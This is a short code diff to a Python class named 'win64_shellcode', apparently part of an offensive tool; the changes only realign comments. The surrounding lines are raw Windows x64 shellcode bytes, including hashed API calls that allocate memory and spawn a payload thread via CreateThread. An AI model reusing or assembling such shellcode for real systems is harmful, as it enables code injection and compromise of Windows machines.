@@ -618,7 +618,7 @@ class win64_shellcode():
                             "\x41\x58"                          #pop r8.. now 1000h
                             "\x4C\x89\xF2"                      #mov rdx, r14
                             "\x6A\x00"                          # push 0
-                            "\x59" #                            pop rcx
+                            "\x59"                              # pop rcx
                             "\x68\x58\xa4\x53\xe5"              #push E553a458
                             "\x41\x5A"                          #pop r10
                             "\xff\xd5"                          #call rbp
@@ -674,7 +674,7 @@ class win64_shellcode():
                             "\x48\x89\xC1"                          #mov rcx, rax        ; LPSECURITY_ATTRIBUTES lpThreadAttributes (NULL)
                             "\x49\xC7\xC2\x38\x68\x0D\x16"          #mov r10, 0x160D6838  ; hash( "kernel32.dll", "CreateThread" )
                             "\xFF\xD5"                              #  call rbp               ; Spawn payload thread
-                            "\x48\x83\xC4\x58"  #add rsp, 50
+                            "\x48\x83\xC4\x58"                      #add rsp, 50
                             
                             #stackrestore
                             "\x9d\x41\x5f\x41\x5e\x41\x5d\x41\x5c\x41\x5b\x41\x5a\x41\x59"
